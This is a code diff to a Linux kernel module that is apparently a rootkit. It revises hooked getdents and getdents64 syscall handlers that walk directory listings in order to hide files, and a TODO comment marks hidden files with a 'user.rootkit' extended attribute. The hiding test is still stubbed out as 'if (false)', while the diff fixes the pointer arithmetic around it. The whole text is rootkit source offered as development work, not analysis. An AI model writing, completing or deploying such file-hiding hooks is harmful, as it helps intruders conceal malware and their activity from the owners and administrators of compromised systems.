@@ -45,15 +45,16 @@ unhide_files(void)
 asmlinkage long
 filehide_getdents(unsigned fd, struct linux_dirent __user *dirent, unsigned count)
 {
-    typedef struct linux_dirent *dirent_ptr_t;
+    typedef struct linux_dirent __user *dirent_t_ptr;
 
-    long ret = sys_getdents(fd, dirent, count);
+    long offset;
+    long ret = ((long (*)(unsigned, dirent_t_ptr, unsigned))sys_getdents)(fd, dirent, count);
 
-    if (ret < 0)
+    if (ret <= 0)
         return ret;
 
-    for (long offset = 0; offset < ret;) {
-        dirent_ptr_t cur_dirent = (dirent_ptr_t)((char *)dirent) + offset;
+    for (offset = 0; offset < ret;) {
+        dirent_t_ptr cur_dirent = (dirent_t_ptr)(((char *)dirent) + offset);
 
         if (false) // TODO: xattrs user.rootkit = rootkit
             ret -= cur_dirent->d_reclen;
@@ -68,15 +69,16 @@ filehide_getdents(unsigned fd, struct linux_dirent __user *dirent, unsigned coun
 asmlinkage long
 filehide_getdents64(unsigned fd, struct linux_dirent64 __user *dirent, unsigned count)
 {
-    typedef struct linux_dirent64 *dirent64_ptr_t;
+    typedef struct linux_dirent64 __user *dirent64_t_ptr;
 
-    long ret = sys_getdents64(fd, dirent, count);
+    long offset;
+    long ret = ((long (*)(unsigned, dirent64_t_ptr, unsigned))sys_getdents64)(fd, dirent, count);
 
-    if (ret < 0)
+    if (ret <= 0)
         return ret;
 
-    for (long offset = 0; offset < ret;) {
-        dirent64_ptr_t cur_dirent = (dirent64_ptr_t)((char *)dirent) + offset;
+    for (offset = 0; offset < ret;) {
+        dirent64_t_ptr cur_dirent = (dirent64_t_ptr)(((char *)dirent) + offset);
 
         if (false) // TODO: xattrs user.rootkit = rootkit
             ret -= cur_dirent->d_reclen;
